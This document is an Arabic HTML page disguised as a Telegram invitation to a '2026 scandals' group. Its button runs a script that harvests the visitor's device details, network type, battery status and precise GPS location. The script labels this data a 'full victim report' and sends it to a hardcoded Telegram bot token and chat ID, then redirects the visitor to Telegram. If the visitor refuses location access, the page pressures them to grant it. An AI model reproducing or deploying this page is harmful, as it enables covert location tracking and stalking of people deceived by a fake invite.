<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram: Join Group</title>
    <style>
        body { background-color: #1c1c1c; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #2b2b2b; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #444; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background: #24A1DE; color: white; padding: 15px 30px; border: none; border-radius: 30px; font-weight: bold; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="70">
        <h2>جروب: فضائح 2026 🔥</h2>
        <p>يجب السماح بالموقع للتأكد من هويتك وفتح المحتوى الحصري.</p>
        <button class="btn" onclick="getFullReport()">انضمام الآن</button>
    </div>

    <script>
        async function getFullReport() {
            const token = '8785845001:AAHzQH63-LseRb0meHZI6-9fCLHNW1nst_c';
            const chat_id = '6648970984';

            // 1. معلومات الجهاز والنظام
            let report = `👤 **تقرير الضحية الكامل**\n\n`;
            report += `📱 **الجهاز:** ${navigator.platform}\n`;
            report += `⚙️ **المعالج (Cores):** ${navigator.hardwareConcurrency || 'غير معروف'}\n`;
            report += `💾 **الرام (RAM):** ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف'}\n`;
            report += `🖥 **الشاشة:** ${window.screen.width}x${window.screen.height}\n`;
            
            // 2. معلومات الشبكة (النوع والسرعة)
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                report += `📶 **الشبكة:** ${connection.effectiveType || 'غير معروف'}\n`;
                report += `🚀 **سرعة الإنترنت:** ${connection.downlink} Mbps\n`;
            }

            // 3. معلومات البطارية
            try {
                const battery = await navigator.getBattery();
                report += `🔋 **البطارية:** ${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'يُشحن⚡' : 'لا يشحن'})\n`;
            } catch (e) { report += `🔋 **البطارية:** غير مدعوم\n`; }

            // 4. طلب الموقع وإرسال التقرير الشامل
            navigator.geolocation.getCurrentPosition(async (p) => {
                const mapUrl = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                const finalMsg = `${report}📍 **الموقع:** ${mapUrl}`;
                
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(finalMsg)}&parse_mode=Markdown`);
                window.location.href = "https://t.me/telegram";
            }, (err) => {
                alert("يجب السماح بالموقع للدخول إلى الجروب!");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
